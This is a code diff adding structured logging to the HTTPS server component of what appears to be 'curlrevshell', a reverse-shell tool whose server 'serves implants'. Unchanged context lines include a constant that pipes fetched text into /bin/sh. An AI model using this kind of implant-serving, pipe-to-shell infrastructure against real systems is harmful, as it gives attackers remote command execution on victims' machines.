@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240329
+ * Last Modified 20240406
  */
 
 import (
@@ -14,6 +14,7 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"log/slog"
 	"net"
 	"net/http"
 	"net/netip"
@@ -46,6 +47,14 @@ const (
 	ShellSuffix = "/c' | /bin/sh"
 )
 
+// Log messages and keys.
+const (
+	LMListening = "Listener started"
+
+	LKError      = "error"
+	LKListenAddr = "address"
+)
+
 var (
 	// CertSubject is the subject we use for the generated TLS certificate.
 	CertSubject = "curlrevshell"
@@ -53,6 +62,7 @@ var (
 
 // Server serves implants over HTTPS.
 type Server struct {
+	sl        *slog.Logger
 	fdir      string /* Static files directory. */
 	ich       <-chan string
 	och       chan<- opshell.CLine
@@ -70,6 +80,7 @@ type Server struct {
 // tmplf is non-empty, it is taken as a file from which to read the callback
 // template.
 func New(
+	sl *slog.Logger,
 	addr string,
 	fdir string,
 	tmplf string,
@@ -121,8 +132,10 @@ func New(
 	); nil != err {
 		return nil, nil, fmt.Errorf("listening on %s: %w", addr, err)
 	}
+	sl.Info(LMListening, LKListenAddr, l.Addr().String())
 
 	return &Server{
+		sl:        sl,
 		fdir:      fdir,
 		ich:       ich,
 		och:       och,
